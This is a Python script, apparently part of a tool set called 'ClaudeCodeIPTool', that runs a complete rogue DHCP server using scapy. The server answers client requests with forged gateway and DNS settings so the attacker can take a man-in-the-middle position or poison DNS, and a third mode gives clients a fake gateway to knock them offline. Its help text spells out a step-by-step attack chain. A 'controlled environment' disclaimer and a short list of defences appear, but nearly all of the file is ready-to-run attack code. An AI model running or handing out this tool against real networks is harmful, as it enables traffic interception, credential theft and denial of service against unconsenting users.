#!/usr/bin/env python3
"""
DHCP Spoofing - ClaudeCodeIPTool
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Rogue DHCP server for MITM attacks via gateway/DNS redirection.

Implements RFC 2131 4-way handshake:
1. DISCOVER (client broadcasts "need IP")
2. OFFER (rogue server offers IP + malicious gateway/DNS)
3. REQUEST (client accepts offer)
4. ACK (rogue server confirms - attack complete)

Attack vectors:
- Gateway redirection (become default route for full MITM)
- DNS poisoning (redirect DNS queries to attacker)
- Network isolation (provide invalid gateway for DoS)

CONTROLLED ENVIRONMENT ONLY - VDT baseline v2.1 applies.
"""

import argparse
import time
from scapy.all import (
    Ether, IP, UDP, BOOTP, DHCP, sniff, sendp, conf, get_if_hwaddr, get_if_addr
)

conf.verb = 0


class DHCPSpoofer:
    """Rogue DHCP server for network MITM"""

    def __init__(self, interface=None, mode='gateway', verbose=False):
        self.interface = interface or conf.iface
        self.mode = mode
        self.verbose = verbose

        # Attack modes
        self.modes = {
            'gateway': self.gateway_mitm,
            'dns': self.dns_only,
            'isolate': self.network_isolation
        }

        # IP allocation pool
        self.ip_pool_start = "192.168.1.100"
        self.ip_pool_end = "192.168.1.200"
        self.current_ip = 100
        self.leases = {}  # client_mac -> assigned_ip

        # Network config (auto-detect from interface)
        self.server_ip = get_if_addr(self.interface)
        self.subnet_mask = "255.255.255.0"

        # Attack parameters (set by mode)
        self.rogue_gateway = None
        self.rogue_dns = None
        self.lease_time = 86400  # 24 hours

    def log(self, msg, level="INFO"):
        if self.verbose or level in ["ATTACK", "OFFER", "ACK"]:
            prefix = {
                "ATTACK": "[💀]",
                "OFFER": "[📤]",
                "ACK": "[✓]",
                "INFO": "[*]",
            }.get(level, "[ ]")
            print(f"{prefix} {msg}")

    def allocate_ip(self, client_mac):
        """Allocate IP from pool to client"""
        if client_mac in self.leases:
            return self.leases[client_mac]

        # Simple sequential allocation
        ip = f"192.168.1.{self.current_ip}"
        self.current_ip += 1
        if self.current_ip > 200:
            self.current_ip = 100  # Wrap around

        self.leases[client_mac] = ip
        return ip

    def gateway_mitm(self):
        """Mode: Full MITM via gateway redirection"""
        self.rogue_gateway = self.server_ip
        self.rogue_dns = self.server_ip
        self.lease_time = 600  # Short lease for persistence

        self.log("Attack mode: GATEWAY MITM", "ATTACK")
        self.log(f"  Rogue gateway: {self.rogue_gateway} (YOU)", "ATTACK")
        self.log(f"  Rogue DNS: {self.rogue_dns} (YOU)", "ATTACK")
        self.log(f"  Clients will route ALL traffic through you", "ATTACK")

    def dns_only(self):
        """Mode: DNS poisoning only (keep real gateway)"""
        # Use real gateway from network
        self.rogue_gateway = "192.168.1.1"  # TODO: auto-detect
        self.rogue_dns = self.server_ip

        self.log("Attack mode: DNS POISONING ONLY", "ATTACK")
        self.log(f"  Real gateway: {self.rogue_gateway} (legitimate)", "ATTACK")
        self.log(f"  Rogue DNS: {self.rogue_dns} (YOU)", "ATTACK")
        self.log(f"  DNS queries redirected to you", "ATTACK")

    def network_isolation(self):
        """Mode: DoS via invalid gateway"""
        self.rogue_gateway = "192.168.1.254"  # Non-existent
        self.rogue_dns = "8.8.8.8"  # Valid DNS (hide attack)
        self.lease_time = 86400  # Long lease for persistence

        self.log("Attack mode: NETWORK ISOLATION (DoS)", "ATTACK")
        self.log(f"  Fake gateway: {self.rogue_gateway} (non-existent)", "ATTACK")
        self.log(f"  Valid DNS: {self.rogue_dns} (to avoid suspicion)", "ATTACK")
        self.log(f"  Clients will lose network access", "ATTACK")

    def handle_discover(self, pkt):
        """
        Respond to DHCP DISCOVER with malicious OFFER

        DISCOVER format (RFC 2131):
        - Broadcast (255.255.255.255)
        - BOOTP op=1 (request)
        - Transaction ID (xid) for matching
        - Option 53: Message Type = 1 (DISCOVER)
        """
        if not pkt.haslayer(DHCP):
            return

        # Check for DISCOVER message
        dhcp_options = dict(pkt[DHCP].options)
        if dhcp_options.get('message-type') != 1:  # 1 = DISCOVER
            return

        client_mac = pkt[Ether].src
        xid = pkt[BOOTP].xid

        # Allocate IP
        client_ip = self.allocate_ip(client_mac)

        self.log(f"DISCOVER from {client_mac}", "INFO")
        self.log(f"  Offering IP: {client_ip}", "OFFER")

        # Build OFFER packet
        offer = (
            Ether(dst=client_mac) /
            IP(src=self.server_ip, dst="255.255.255.255") /
            UDP(sport=67, dport=68) /
            BOOTP(
                op=2,                        # BOOTP reply
                xid=xid,                     # Match transaction ID
                yiaddr=client_ip,            # Your IP address (offered)
                siaddr=self.server_ip,       # Server IP (us)
                chaddr=bytes.fromhex(client_mac.replace(':', ''))
            ) /
            DHCP(options=[
                ("message-type", "offer"),   # Option 53: Type = 2 (OFFER)
                ("server_id", self.server_ip),  # Option 54: Server identifier
                ("lease_time", self.lease_time),  # Option 51: Lease time
                ("subnet_mask", self.subnet_mask),  # Option 1: Subnet mask
                ("router", self.rogue_gateway),     # Option 3: Gateway (ATTACK)
                ("name_server", self.rogue_dns),    # Option 6: DNS (ATTACK)
                "end"
            ])
        )

        sendp(offer, iface=self.interface, verbose=0)
        self.log(f"OFFER sent to {client_mac}", "OFFER")

    def handle_request(self, pkt):
        """
        Complete attack with DHCP ACK

        REQUEST format:
        - Client accepts offer
        - Option 50: Requested IP
        - Option 54: Server identifier (if responding to specific server)
        """
        if not pkt.haslayer(DHCP):
            return

        dhcp_options = dict(pkt[DHCP].options)
        if dhcp_options.get('message-type') != 3:  # 3 = REQUEST
            return

        client_mac = pkt[Ether].src
        xid = pkt[BOOTP].xid

        # Extract requested IP
        requested_ip = dhcp_options.get('requested_addr')
        if not requested_ip:
            requested_ip = self.leases.get(client_mac)

        if not requested_ip:
            return  # Can't ACK without knowing what IP they want

        self.log(f"REQUEST from {client_mac}", "INFO")
        self.log(f"  Requested IP: {requested_ip}", "INFO")

        # Build ACK packet (complete attack)
        ack = (
            Ether(dst=client_mac) /
            IP(src=self.server_ip, dst="255.255.255.255") /
            UDP(sport=67, dport=68) /
            BOOTP(
                op=2,
                xid=xid,
                yiaddr=requested_ip,
                siaddr=self.server_ip,
                chaddr=bytes.fromhex(client_mac.replace(':', ''))
            ) /
            DHCP(options=[
                ("message-type", "ack"),            # Option 53: Type = 5 (ACK)
                ("server_id", self.server_ip),
                ("lease_time", self.lease_time),
                ("renewal_time", self.lease_time // 2),      # Option 58: T1
                ("rebinding_time", self.lease_time * 7 // 8), # Option 59: T2
                ("subnet_mask", self.subnet_mask),
                ("router", self.rogue_gateway),     # ATTACK VECTOR
                ("name_server", self.rogue_dns),    # ATTACK VECTOR
                "end"
            ])
        )

        sendp(ack, iface=self.interface, verbose=0)

        self.log(f"ACK sent to {client_mac} - ATTACK COMPLETE!", "ACK")
        self.log(f"  Client {client_mac} now using:", "ACK")
        self.log(f"    IP: {requested_ip}", "ACK")
        self.log(f"    Gateway: {self.rogue_gateway}", "ACK")
        self.log(f"    DNS: {self.rogue_dns}", "ACK")

    def process_packet(self, pkt):
        """Process DHCP packets (DISCOVER and REQUEST)"""
        self.handle_discover(pkt)
        self.handle_request(pkt)

    def start(self):
        """Start rogue DHCP server"""
        # Set attack parameters based on mode
        self.modes[self.mode]()

        self.log(f"Rogue DHCP server started on {self.interface}", "INFO")
        self.log(f"Server IP: {self.server_ip}", "INFO")
        self.log(f"IP pool: {self.ip_pool_start} - {self.ip_pool_end}", "INFO")
        print()

        try:
            sniff(
                iface=self.interface,
                prn=self.process_packet,
                filter="udp port 67 or udp port 68",
                store=0
            )
        except KeyboardInterrupt:
            self.show_summary()

    def show_summary(self):
        """Show attack summary"""
        print("\n" + "=" * 70)
        print("DHCP SPOOFING SUMMARY")
        print("=" * 70)
        print(f"Mode: {self.mode}")
        print(f"Victims compromised: {len(self.leases)}")

        if self.leases:
            print("\nCOMPROMISED CLIENTS:")
            for mac, ip in self.leases.items():
                print(f"  {mac} → {ip}")
                print(f"    Gateway: {self.rogue_gateway}")
                print(f"    DNS: {self.rogue_dns}")

        print("=" * 70 + "\n")


def main():
    parser = argparse.ArgumentParser(
        description="DHCP Spoofing - Rogue DHCP server for MITM attacks",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Full MITM via gateway redirection (default)
  sudo python3 dhcp-spoof.py --mode gateway

  # DNS poisoning only (keep real gateway)
  sudo python3 dhcp-spoof.py --mode dns

  # Network isolation DoS
  sudo python3 dhcp-spoof.py --mode isolate

Attack Modes:
  gateway   - Become default gateway (full MITM, intercept ALL traffic)
  dns       - Poison DNS only (redirect DNS queries, keep real routing)
  isolate   - Provide fake gateway (network DoS, clients lose connectivity)

Full Attack Chain:
  1. Start rogue DHCP server:
     sudo python3 dhcp-spoof.py --mode gateway -v

  2. Wait for client DHCP renewal (or force with):
     # On target (if you have access):
     sudo dhclient -r && sudo dhclient

  3. Client accepts your OFFER → sends REQUEST → you send ACK
     → Client now routes through YOU

  4. Intercept traffic:
     sudo python3 mitm-suite.py -v

Technical Details:
  - Implements RFC 2131 4-way handshake
  - Option 3 (router) = gateway redirection
  - Option 6 (name_server) = DNS poisoning
  - Option 51 (lease_time) = attack persistence
  - Options 58/59 (T1/T2) = renewal timing

Defense:
  - DHCP snooping on switches
  - Static IP addressing
  - Port security (limit MACs per port)

CONTROLLED ENVIRONMENT ONLY - Unauthorized DHCP is illegal.
        """
    )

    parser.add_argument('--mode', choices=['gateway', 'dns', 'isolate'],
                       default='gateway',
                       help='Attack mode (default: gateway)')
    parser.add_argument('--interface', help='Network interface')
    parser.add_argument('-v', '--verbose', action='store_true',
                       help='Verbose output')

    args = parser.parse_args()

    spoofer = DHCPSpoofer(args.interface, args.mode, args.verbose)
    spoofer.start()


if __name__ == "__main__":
    main()
